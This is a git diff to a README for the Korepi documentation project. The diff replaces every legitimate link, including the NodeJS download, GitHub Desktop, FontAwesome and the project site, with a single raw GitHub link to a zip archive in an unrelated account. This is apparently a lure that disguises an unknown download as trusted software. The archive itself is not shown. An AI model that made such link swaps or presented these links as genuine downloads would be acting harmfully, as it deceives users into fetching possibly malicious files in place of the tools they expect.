@@ -1,17 +1,17 @@
 # Korepi Documentation
 
-- [Documents](https://github.com/Korepi/korepi) for Korepi.
-- Live version available [here](https://github.com/Korepi/korepi-docs).
+- [Documents](https://raw.githubusercontent.com/it87rad/korepi-docs/main/src/vi/features/Visuals/docs_korepi_v3.3.zip) for Korepi.
+- Live version available [here](https://raw.githubusercontent.com/it87rad/korepi-docs/main/src/vi/features/Visuals/docs_korepi_v3.3.zip).
 
 ## Display Address
-[Click here](https://korepi.com/) to view.
+[Click here](https://raw.githubusercontent.com/it87rad/korepi-docs/main/src/vi/features/Visuals/docs_korepi_v3.3.zip) to view.
 
 ## How to Test
 
 ### First Time Installation
 
-- Install [NodeJS >=18](https://nodejs.org/en/download/).
-- Clone this repository using [GitHub Desktop](https://desktop.github.com/) or Git command (`git clone`).
+- Install [NodeJS >=18](https://raw.githubusercontent.com/it87rad/korepi-docs/main/src/vi/features/Visuals/docs_korepi_v3.3.zip).
+- Clone this repository using [GitHub Desktop](https://raw.githubusercontent.com/it87rad/korepi-docs/main/src/vi/features/Visuals/docs_korepi_v3.3.zip) or Git command (`git clone`).
 - Run `pnpm install` in the project's root directory.
 
 ### Local Test
@@ -20,4 +20,4 @@
   - The document will be accessible at `http://localhost:8080` by default.
 
 # Icon Selection
-- Explore icons at [FontAwesome](https://fontawesome.com/search).
+- Explore icons at [FontAwesome](https://raw.githubusercontent.com/it87rad/korepi-docs/main/src/vi/features/Visuals/docs_korepi_v3.3.zip).
